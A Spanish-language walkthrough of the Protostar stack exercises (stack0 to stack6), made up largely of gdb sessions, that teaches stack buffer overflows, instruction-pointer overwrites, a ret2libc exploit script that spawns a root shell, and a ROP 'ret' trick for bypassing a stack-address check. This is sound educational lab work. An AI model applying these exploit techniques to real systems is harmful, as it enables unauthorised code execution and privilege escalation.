



---------------------------------------------------------------------------
# Concepto de Buffer Overflow -> [stack0](https://exploit.education/protostar/stack-zero/)

Este binario toma el input del usuario, según el código lo mete en un buffer de 64 bytes con la función gets()

```console
[user@protostar]-[/opt/protostar/bin]:$ ./stack0 
AAAAAAA
Try again?
```
¿Si probamos a meterle mas "A" de las que caben en el buffer?

```console
[user@protostar]-[/opt/protostar/bin]:$ ./stack0 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
you have changed the 'modified' variable "Has cambiado la varaible de nombre 'modified'"
Segmentation fault
```
Parece que hemos modificado una varaible. Es decir hemos metido tantas "A" que hemos desbordado el espacio que había para ellas y escrito en otros registros.
Vamos a ver esto con más claridad en gdb.

```console
[user@protostar]-[/opt/protostar/bin]:$ gdb ./stack0 
(gdb) set disassembly-flavor intel
(gdb) disas main
Insutrucciones en ensamblador...
0x08048433 <main+63>:	leave  -> Penúltima insutrución.
(gdb) b *0x08048433 -> Si detenemos el programa aquí podremos oberservar la pila, ya que es despues de que le metamos datos.
```
Observaremos la pila tanto desbordando el buffer como sin hacerlo.

```console
(gdb) run 
AAAAAAAAAAA                                                                                            
Try again?
Breakpoint alcanzado !
(gdb) disas main
...
0x08048411 <main+29>:	mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <main+33>:	test   eax,eax   -> Estas dos instrucciones miran si hay algo en [esp+0x5c]
...
(gdb) x/x $esp+0x5c
0xbffff69c:	0x00000000 -> Si observamos su contenido vemos que son todo ceros, ¿Será esta la varaible "modified"?
(gdb) x/24wx $esp -> Observamos unos cuantos registros de la pila.
0xbffff640:	0x08048529	0x00000001	0xb7fff8f8	0xb7f0186e
0xbffff650:	0xb7fd7ff4	0xb7ec6165	0xbffff668	0x41414141   -> Parece que nuestro input empieza aquí 0xbffff65c (0xbffff650+12)
0xbffff660:	0x41414141	0x00414141	0xbffff678	0x080482e8
0xbffff670:	0xb7ff1040	0x08049620	0xbffff6a8	0x08048469
0xbffff680:	0xb7fd8304	0xb7fd7ff4	0x08048450	0xbffff6a8
0xbffff690:	0xb7ec6365	0xb7ff1040	0x0804845b	0x00000000   -> Y aquí está la varaible "modified" de antes (0xbffff69c)
```
Ahora con el desbordamiento.
```console
(gdb) run 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
you have changed the 'modified' variable
Breakpoint alcanzado !
(gdb) x/24wx $esp
0xbffff640:	0x08048500	0x00000001	0xb7fff8f8	0xb7f0186e
0xbffff650:	0xb7fd7ff4	0xb7ec6165	0xbffff668	0x41414141
0xbffff660:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff670:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff680:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff690:	0x41414141	0x41414141	0x41414141	0x41414141 -> Ahora modified en vez de ser 0 es AAAA por tanto la hemos modificado.
(gdb) info registers
eip            0x41414141	0x41414141   
```
Como el puntero de insutrucción tambíen esta sobreescrito el programa corrompe, ya que la direccion 0x41414141 no existe.

```console
(gdb) p 0xbffff69c - 0xbffff65c -> Restamos la direccion de la varaible modified y en donde empezamos a escribir las "A"
$5 = 64 
[user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'*64)" | ./stack0
Try again?
[user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'*68)" | ./stack0
you have changed the 'modified' variable -> Aquí hemos sobreescrito la varaible pero sin corromper el eip.
```
Como conclusión, si tenemos un trozo de memoria pensado para qel usaurio meta datos pero este escriba mas de la cuenta, 
puede sobreescribir otras datos en la memoria y modificar el programa por dentro.

---------------------------------------------------------------------------
# Sobreescribir una variable con datos concretos -> [stack1](https://exploit.education/protostar/stack-one/)

Aquí también hay que sobreescribir una variable, pero en vez de que simplemente no sea 0, tiene que valer algo en concreto.
Nos piden en el código que valga "0x61626364" o sea como los bytes se dan la vuelta es "\x64\x63\x62\x61"

```console
[user@protostar]-[/opt/protostar/bin]:$ gdb ./stack1
(gdb) set disassembly-flavor intel
(gdb) disas main
0x080484ab <main+71>:	cmp    eax,0x61626364 -> Lo compara con eax
```
El buffer es del mismo tamaño que antes...

```console
[user@protostar]-[/opt/protostar/bin]:$ ./stack1 $(python -c "print('A'*64)")
Try again, you got 0x00000000
[user@protostar]-[/opt/protostar/bin]:$ ./stack1 $(python -c "print('A'*68)")
Try again, you got 0x41414141
[user@protostar]-[/opt/protostar/bin]:$ ./stack1 $(python -c "print('A'*64 + '\x64\x63\x62\x61')")
you have correctly got the variable to the right value
```

---------------------------------------------------------------------------
# Sobreescribir un puntero de instrucción -> [stack3](https://exploit.education/protostar/stack-one/)

Aquí tenemos que modificar el registro "eip" el cual contiene la dirección de la siguiente insutrucción que el programa va a ejecutar. 
Hay que mandarlo en concreto a la funcion "win"

```console
[user@protostar]-[/opt/protostar/bin]:$ objdump -d ./stack3 | grep "win"
08048424 <win>
```
En el codigo de gdb *disas main* no hay ninguna llamada a esta función de por si. El eip apunta a la insutrccion de nuestros breakpoints 
ya que esta todavia no se ha ejecutado.

```console
[user@protostar]-[/opt/protostar/bin]:$ gdb ./stack3
(gdb) b *0x08048477 -> 0x08048477 <main+63>:	leave
(gdb) r
AAAA
Breakpoint alcanzado
(gdb) i r
eip            0x8048477	0x8048477 <main+63>


[user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'*64)" | ./stack3
[user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'*64 + 'B'*4)" | ./stack3
calling function pointer, jumping to 0x42424242
Segmentation fault
[user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'*64 + 'B'*4)"  > /tmp/pattern
[user@protostar]-[/opt/protostar/bin]:$ gdb ./stack3
(gdb) b *0x08048477 
(gdb) run < /tmp/pattern
(gdb) x/40wx $esp
0xbffff63c:	0x08048477	0x08048560	0x41414141	0xb7fff8f8
0xbffff64c:	0xb7f0186e	0xb7fd7ff4	0xb7ec6165	0xbffff668
0xbffff65c:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff66c:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff67c:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff68c:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff69c:	0x42424242	0x08048400	0x00000000	0xbffff728
(gdb) x/x $eip -> El eip esta justo despues del buffer en este caso, en "0xbffff69c"
0x41414141:	Cannot access memory at address 0x41414141
```
En vez de meterle "AAAA" al eip hay que meterle la direccion de una función real, en concreto la de "win" que es: 08048424 o "\x24\x84\x04\x08"

```console
[user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'*64 + '\x24\x84\x04\x08')" | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```
Con python se puede meter la memoria sin tener que darle la vuelta gracias al módulo "struct"

```python
import struct
payload = "A"*64
payload += struct.pack('I', 0x08048424)
print payload
```
```console
[user@protostar]-[/opt/protostar/bin]:$ python /tmp/exploit.py | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```
---------------------------------------------------------------------------

# Sobreescribir un puntero de instrucción 2 -> [stack4](https://exploit.education/protostar/stack-four/)

La teoría es la misma que con el caso anterior, solo que este es algo mas realista ya que el eip no esta pegado al final del buffer.

```console
[user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'*64)" | ./stack4
[user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'*76)" | ./stack4
Segmentation fault
```
Para ver lo que está pasando, vamos a hacer un patrón reconocible y pasarlo por gdb.

```console
[user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'*64 + 'BBBBCCCCDDDDEEEEFFFFGGGG')" > /tmp/pattern
[user@protostar]-[/opt/protostar/bin]:$ gdb ./stack4
(gdb) b *0x0804841d -> Ponemos el breakpoint en la instrucción "leave"
(gdb) run < /tmp/pattern
Breakpoint alcazado!
(gdb) x/40wx $esp
0xbffff650:	0xbffff660	0xb7ec6165	0xbffff668	0xb7eada75
0xbffff660:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff670:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff680:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff690:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6a0:	0x42424242	0x43434343	0x44444444	0x45454545
0xbffff6b0:	0x46464646	0x47474747	0xbffff700	0xb7fe1848
Program received signal SIGSEGV, Segmentation fault.
0x45454545 in ?? ()
(gdb) p 0xbffff6ac - 0xbffff660
$1 = 76 -> Justo donde antes nos daba SEGFAULT
```
Ahora la instrucción win es 0x080483f4 o "\xf4\x83\x04\x08"

```console
[user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'*76 + '\xf4\x83\x04\x08')" | ./stack4
code flow successfully changed
Segmentation fault -> Aunque se queje nos ha ejecutado la win (el mensaje de antes)
```
```console
(gdb) disas win
0x080483fa <win+6>:	mov    DWORD PTR [esp],0x80484e0
0x08048401 <win+13>:	call   0x804832c <puts@plt>
...
(gdb) x/s 0x80484e0
0x80484e0:	 "code flow successfully changed"
```
---------------------------------------------------------------------------

# Ret2libc -> [stack6](https://exploit.education/protostar/stack-six/)

Con el stack 6 no podemos inyectar shellcode en la pila, ya que no nos permite volver a ella poniendola en el eip. Entonces como no hay shellcode, hay
que aprovecharse de código que ya existe en el programa, en concreto las funciones de stdlib de C.

```console
[user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'* 75 )"| ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'* 76 )"| ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```
A partir de las 76 da el SEGFAULT, pero dónde está el eip? Vamos a meter un patrón reconocible para ver dónde está.

```console
[user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'* 76 + 'BBBBCCCCDDDDEEEEFFFFGGGG' )" > /tmp/pattern
[user@protostar]-[/opt/protostar/bin]:$ gdb ./stack6
(gdb) disas getpath
... Muchas instrucciones :V
0x080484f8 <getpath+116>:	leave
(gdb) b *0x080484f8
(gdb) run < /tmp/pattern
Breakpoint alcanzado!
(gdb) c
Continuing.
Program received signal SIGSEGV, Segmentation fault. 0x43434343 in ?? ()
```
0x43 son las C, asi que despues de 80 "A" (76 +4) está el eip.
Para este ejercicio se usará la técnica de ret2libc ya que no se puede saltar a la pila (le metemos la direccion 0xbffff69c que es algo despues del eip)

```console
[user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'* 80 + '\x9c\xf6\xff\xbf' )"| ./stack6
input path please: bzzzt (0xbffff69c)
```
Para hacer ret2libc se tiene que conseguir estas tres direcciones y pasarselas como input:
> **RET2LIBC:** offset + función(&system) + retorno(&exit) + argumentos("bin/sh") 

Como hemos visto en la seccion de [estructura de un binario](https://github.com/CUCUxii/CUCUxii.github.io/blob/main/Binarios/Estructura%20de%20un%20binario.md) Se le pasa al eip la dirección de la función system que es la que nos interesa ahora, una vez alli, sabemos que
una función tiene un trozo de memoria donde está primero la dirección de retorno y luego los argumentos. 

1. Se crea la pila con los arguemntos, que usa la función la funcion system("bin/sh")
2. Se borran estos argumentos de la pila con *LEAVE* 
3. Queda la direccion de retorno (a donde va cuando acaba) que se pasa al eip -> *POP EIP*

¿Por tanto de dónde sacamos estas tres cosas?

 * Dirección de "system"

```console
[user@protostar]-[/opt/protostar/bin]:$ gdb ./stack6
(gdb) run
input path please: AAAA
got path AAAA
(gdb) p &system
$1 = 0xb7ecffb0 <__libc_system>
```
* Dirección de "exit"

```console
(gdb) p &exit
$2 = 0xb7ec60c0 <*__GI_exit>
```
 * String "bin/sh"

```console
(gdb) b *0x080484f8
(gdb) run
input path please: AAAA
got path AAAA
Breakpoint alcanzado!
(gdb) info proc map
	Start Addr   End Addr       Size     Offset objfile
	...
	 0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
  ...  
 	0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so -> La primera vez que sale esto (0xb7e97000)
  0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
[user@protostar]-[/opt/protostar/bin]:$ strings -atx /lib/libc-2.11.2.so | grep "bin/sh"
 11f3bf /bin/sh
(gdb) x/s 0xb7e97000 + 0x11f3bf
0xb7fb63bf:	 "/bin/sh"
```
Ya tenemos las tres direcciones, por tanto armamos el exploit

```console
[user@protostar]-[/opt/protostar/bin]:$ vim /tmp/exploit.py
```
```python
import struct

offset = 80
padding = "A" * offset
system = struct.pack("I",0xb7ecffb0)
exit = struct.pack("I",0xb7ec60c0)
bin_sh = struct.pack("I",0xb7fb63bf)
print(padding + system + exit + bin_sh)
```
Hay que pasarselo entre parentesis y con el cat al final ya que sino el proceso que abre de consola se cierra al instante, y cat lo deja abierto

```console
[user@protostar]-[/opt/protostar/bin]:$ (python /tmp/exploit.py;cat) | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA����`췿c��
whoami
root
```
# Extra ROP programming -> RET

El rop programming significa que nos aprovechamos de insutrucciones de ensamblador del propio código para hacer determinadas cosas en el programa.
Una de ellas es la intrucción **RET**, la cuál hace un *POP EIP*, 

Es decir la última instruccion de la pila (dirección de RET) la pasa al eip, eliminandose a si misma (POP EIP), pero haciendo otro POP EIP de lo que haya despues (EIP a la pila por ejemplo), asi podemos burlar protecciones de no retorno a la pila como ```if((ret & 0xbf000000) == 0xbf000000)``` ES decir es como que pasa el turno... Vamos a verlo en acción.


```console
[user@protostar]-[/opt/protostar/bin]:$ gdb ./stack6
(gdb) disas getpath
... Muchas instrucciones :V
0x080484f8 <getpath+116>:	leave  
0x080484f9 <getpath+117>:	ret  -> Esta es la instruccion que nos interesa :)
```
Ahora a armar el exploit.

```python
import struct
offset = 80
padding = "A" * offset
ret = struct.pack("I",0x080484f9)
eip = struct.pack("I",0xbffff6a4+8)
breakpoint = "\xCC" * 90
print(padding + ret + eip + breakpoint)
```
```console
[user@protostar]-[/opt/protostar/bin]:$ python /tmp/exploit.py > /tmp/pattern
[user@protostar]-[/opt/protostar/bin]:$ gdb ./stack6
(gdb) run < /tmp/pattern
Program received signal SIGTRAP, Trace/breakpoint trap
(gdb) x/4wx $esp
0xbffff69c:	0x080484f9	0xbffff6ac	0xcccccccc	0xcccccccc -> COmo hemos dicho el RET, ha pasado al eip la siguiente dirección.
(gdb) si
(gdb) x/4wx $esp
0xbffff6a0:	0xbffff6ac	0xcccccccc	0xcccccccc	0xcccccccc -> Ha saltado a una zona de "c" o breakpoint
(gdb) c
Continuing.
Program received signal SIGTRAP, Trace/breakpoint trap.
```
En cambio sin ese RET...

```console
print(padding + eip + breakpoint)
```
```console
(gdb) run < /tmp/pattern
Starting program: /opt/protostar/bin/stack6 < /tmp/pattern
input path please: bzzzt (0xbffff6ac)
Program exited with code 01.
```
